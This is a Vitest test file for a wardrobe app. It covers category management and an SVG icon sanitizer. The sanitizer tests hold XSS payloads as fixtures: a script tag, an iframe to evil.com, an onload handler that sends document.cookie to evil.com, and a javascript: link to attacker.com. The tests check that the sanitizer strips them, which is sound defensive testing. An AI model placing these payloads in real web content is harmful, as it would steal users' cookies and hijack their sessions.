/**
 * YORVYN — Customizable Wardrobe Categories & SVG Sanitization Tests
 * Tests category CRUD, ordering, visibility, pinning, persistence, and security sanitization.
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { wardrobeCategoryService } from '../../../services/wardrobeCategoryService';
import { sanitizeSvgIcon } from '../../../utils/svgSanitizer';

// Mock localStorage for Vitest
const storageMap: Record<string, string> = {};
const mockLocalStorage = {
  getItem: vi.fn((key: string) => storageMap[key] || null),
  setItem: vi.fn((key: string, val: string) => {
    storageMap[key] = val;
  }),
  removeItem: vi.fn((key: string) => {
    delete storageMap[key];
  }),
  clear: vi.fn(() => {
    Object.keys(storageMap).forEach(k => delete storageMap[k]);
  })
};

Object.defineProperty(globalThis, 'localStorage', {
  value: mockLocalStorage,
  writable: true
});

describe('Customizable Wardrobe Category System', () => {
  beforeEach(() => {
    mockLocalStorage.clear();
    wardrobeCategoryService.resetToDefaults();
  });

  // ── 1. Default Categories Loading ──
  it('loads standard default categories matching luxury fashion reference', () => {
    const categories = wardrobeCategoryService.getCategories();
    expect(categories.length).toBeGreaterThanOrEqual(6);

    const ids = categories.map(c => c.id);
    expect(ids).toContain('all');
    expect(ids).toContain('tops');
    expect(ids).toContain('bottoms');
    expect(ids).toContain('outerwear');
    expect(ids).toContain('shoes');
    expect(ids).toContain('accessories');

    const tops = categories.find(c => c.id === 'tops');
    expect(tops).toBeDefined();
    expect(tops?.label).toBe('Tops');
    expect(tops?.isDefault).toBe(true);
    expect(tops?.isVisible).toBe(true);
  });

  // ── 2. Adding Custom Categories ──
  it('adds a new lifestyle/fashion category with preset icon', () => {
    const created = wardrobeCategoryService.addCategory({
      label: 'Watches & Horology',
      itemType: 'watch',
      iconType: 'preset',
      iconKey: 'Watch',
      description: 'Luxury mechanical timepieces'
    });

    expect(created.id).toContain('watches');
    expect(created.isDefault).toBe(false);
    expect(created.isVisible).toBe(true);

    const all = wardrobeCategoryService.getCategories();
    expect(all.some(c => c.id === created.id)).toBe(true);
  });

  it('adds custom categories for perfume, cosmetics, gadgets, and collectibles', () => {
    const fragrance = wardrobeCategoryService.addCategory({
      label: 'Fragrances',
      itemType: 'fragrance',
      iconType: 'preset',
      iconKey: 'Drop'
    });

    const jewelry = wardrobeCategoryService.addCategory({
      label: 'Fine Jewelry',
      itemType: 'jewelry',
      iconType: 'preset',
      iconKey: 'Diamond'
    });

    const categories = wardrobeCategoryService.getCategories();
    expect(categories.find(c => c.id === fragrance.id)).toBeDefined();
    expect(categories.find(c => c.id === jewelry.id)).toBeDefined();
  });

  // ── 3. Updating and Renaming Categories ──
  it('updates category label, description, and icon', () => {
    const custom = wardrobeCategoryService.addCategory({
      label: 'Old Label',
      itemType: 'clothing',
      iconType: 'preset',
      iconKey: 'Tag'
    });

    const updated = wardrobeCategoryService.updateCategory(custom.id, {
      label: 'Vintage Jackets',
      description: 'Archival 90s outerwear collection',
      iconKey: 'CoatHanger'
    });

    expect(updated?.label).toBe('Vintage Jackets');
    expect(updated?.description).toBe('Archival 90s outerwear collection');
    expect(updated?.iconKey).toBe('CoatHanger');
  });

  // ── 4. Category Visibility and Pinning ──
  it('toggles visibility and pinning correctly', () => {
    const tops = wardrobeCategoryService.getCategories().find(c => c.id === 'tops')!;
    expect(tops.isVisible).toBe(true);

    const hidden = wardrobeCategoryService.toggleVisibility(tops.id, false);
    expect(hidden?.isVisible).toBe(false);

    const pinned = wardrobeCategoryService.togglePin(tops.id, true);
    expect(pinned?.isPinned).toBe(true);
  });

  // ── 5. Reordering Categories ──
  it('reorders categories according to user custom arrangement', () => {
    const initial = wardrobeCategoryService.getCategories();
    const originalIds = initial.map(c => c.id);
    const reorderedIds = [originalIds[1], originalIds[0], ...originalIds.slice(2)];

    const updated = wardrobeCategoryService.reorderCategories(reorderedIds);
    expect(updated[0].id).toBe(originalIds[1]);
    expect(updated[1].id).toBe(originalIds[0]);
    expect(updated[0].sortOrder).toBe(0);
    expect(updated[1].sortOrder).toBe(1);
  });

  // ── 6. Deleting Categories Safely ──
  it('deletes user-created custom categories without deleting protected defaults', () => {
    const custom = wardrobeCategoryService.addCategory({
      label: 'Temporary Collection',
      itemType: 'clothing',
      iconType: 'preset',
      iconKey: 'Package'
    });

    expect(wardrobeCategoryService.getCategories().some(c => c.id === custom.id)).toBe(true);

    const success = wardrobeCategoryService.deleteCategory(custom.id);
    expect(success).toBe(true);
    expect(wardrobeCategoryService.getCategories().some(c => c.id === custom.id)).toBe(false);

    // Attempting to delete protected system category 'all' should fail safely
    const deleteDefault = wardrobeCategoryService.deleteCategory('all');
    expect(deleteDefault).toBe(false);
    expect(wardrobeCategoryService.getCategories().some(c => c.id === 'all')).toBe(true);
  });
});

describe('Security: Custom SVG Icon Sanitizer', () => {
  // ── 1. Clean Vector Path Acceptance ──
  it('accepts clean, valid SVG icons with standard shapes', () => {
    const validSvg = `
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
        <circle cx="12" cy="12" r="10" fill="none" stroke="currentColor" stroke-width="2"/>
        <path d="M12 6v6l4 2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
      </svg>
    `;

    const result = sanitizeSvgIcon(validSvg);
    expect(result.success).toBe(true);
    expect(result.sanitizedSvg).toContain('<svg');
    expect(result.sanitizedSvg).toContain('circle');
    expect(result.sanitizedSvg).toContain('path');
  });

  // ── 2. Script and Malicious Tag Rejection ──
  it('strips <script> tags and active executable code', () => {
    const maliciousSvg = `
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
        <script>alert("XSS Attack");</script>
        <circle cx="12" cy="12" r="10"/>
      </svg>
    `;

    const result = sanitizeSvgIcon(maliciousSvg);
    expect(result.success).toBe(true);
    expect(result.sanitizedSvg).not.toContain('<script');
    expect(result.sanitizedSvg).not.toContain('alert');
    expect(result.sanitizedSvg).toContain('<circle');
  });

  it('strips <foreignObject>, <iframe>, <object>, and <embed> tags', () => {
    const exploitSvg = `
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
        <foreignObject width="100" height="100">
          <iframe src="https://evil.com"></iframe>
        </foreignObject>
        <path d="M0 0h24v24H0z"/>
      </svg>
    `;

    const result = sanitizeSvgIcon(exploitSvg);
    expect(result.success).toBe(true);
    expect(result.sanitizedSvg).not.toContain('foreignObject');
    expect(result.sanitizedSvg).not.toContain('iframe');
    expect(result.sanitizedSvg).toContain('<path');
  });

  // ── 3. Malicious Inline Event Handlers ──
  it('strips inline JavaScript event handlers (onload, onerror, onclick)', () => {
    const eventHandlerSvg = `
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" onload="fetch('https://evil.com?c=' + document.cookie)">
        <circle cx="12" cy="12" r="10" onclick="alert(1)" onerror="console.log('err')"/>
      </svg>
    `;

    const result = sanitizeSvgIcon(eventHandlerSvg);
    expect(result.success).toBe(true);
    expect(result.sanitizedSvg).not.toContain('onload');
    expect(result.sanitizedSvg).not.toContain('onclick');
    expect(result.sanitizedSvg).not.toContain('onerror');
    expect(result.sanitizedSvg).not.toContain('evil.com');
  });

  // ── 4. Protocol Vector Injection ──
  it('blocks javascript: and data:text/html protocol vectors in links', () => {
    const protocolSvg = `
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
        <a href="javascript:void(document.location='http://attacker.com')">
          <rect width="20" height="20"/>
        </a>
      </svg>
    `;

    const result = sanitizeSvgIcon(protocolSvg);
    expect(result.success).toBe(true);
    expect(result.sanitizedSvg).not.toContain('javascript:');
    expect(result.sanitizedSvg).not.toContain('attacker.com');
  });

  // ── 5. Payload Size Guard ──
  it('rejects oversized SVG payloads exceeding 256 KB memory budget', () => {
    const largeContent = '<path d="' + 'M0 0 L10 10 '.repeat(25000) + '"/>';
    const giantSvg = `<svg viewBox="0 0 100 100">${largeContent}</svg>`;

    const result = sanitizeSvgIcon(giantSvg);
    expect(result.success).toBe(false);
    expect(result.error).toContain('exceeds maximum allowed size');
  });
});
